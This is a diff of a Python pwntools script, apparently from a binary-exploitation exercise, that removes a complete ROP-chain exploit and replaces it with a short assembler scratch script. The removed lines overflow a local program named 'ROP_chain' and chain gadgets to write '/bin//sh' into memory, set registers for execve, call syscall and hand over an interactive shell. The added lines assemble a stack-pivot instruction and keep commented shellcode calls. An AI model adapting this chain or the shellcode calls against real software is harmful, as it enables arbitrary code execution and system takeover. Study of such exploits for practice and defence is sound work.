@@ -1,85 +1,11 @@
-#! /usr/bin/python
+#!/usr/bin/env python
+#mov esp,0x080F6CC0
 from pwn import *
-from struct import *
-io = process('./ROP_chain')
-context.terminal = ['tmux', 'splitw', '-h']
-#gdb.attach(io, 'b *400ffc')
-p = 'a'* 0x88
-p += pack('<Q', 0x0000000000401b27) # pop rsi ; ret
-p += pack('<Q', 0x00000000006bd080) # @ .data 
-p += pack('<Q', 0x0000000000475cea) # pop rax ; ret 
-p += '/bin//sh' 
-p += pack('<Q', 0x0000000000448151) # mov qword ptr [rsi], rax ; ret    
-p += pack('<Q', 0x0000000000401b27) # pop rsi ; ret 
-p += pack('<Q', 0x00000000006bd088) # @ .data + 8 
-p += pack('<Q', 0x000000000042e51f) # xor rax, rax ; ret  
-p += pack('<Q', 0x0000000000448151) # mov qword ptr [rsi], rax ; ret  
-p += pack('<Q', 0x0000000000401a0e) # pop rdi ; ret 
-p += pack('<Q', 0x00000000006bd080) # @ .data 
-p += pack('<Q', 0x0000000000401b27) # pop rsi ; ret
-p += pack('<Q', 0x00000000006bd088) # @ .data + 8 
-p += pack('<Q', 0x0000000000411f36) # pop rdx ; ret 
-p += pack('<Q', 0x00000000006bd088) # @ .data + 8
-p += pack('<Q', 0x000000000042e51f) # xor rax, rax ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret 
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret 
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret 
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret 
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret 
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret 
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret 
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret 
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret 
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret 
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret 
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret
-p += pack('<Q', 0x00000000004722c0) # add rax, 1 ; ret 
-p += pack('<Q', 0x0000000000401930) # syscall
-io.sendline(p)
-io.interactive()
+p = asm('''
+mov esp,0x080F6CC0
+ret
+''', arch='x86_64', os='linux')
+print(repr(p))
+#print shellcraft.linux.sh()
+#print asm(shellcraft.linux.sh())
+print disasm("\x89\xcc\xc3")
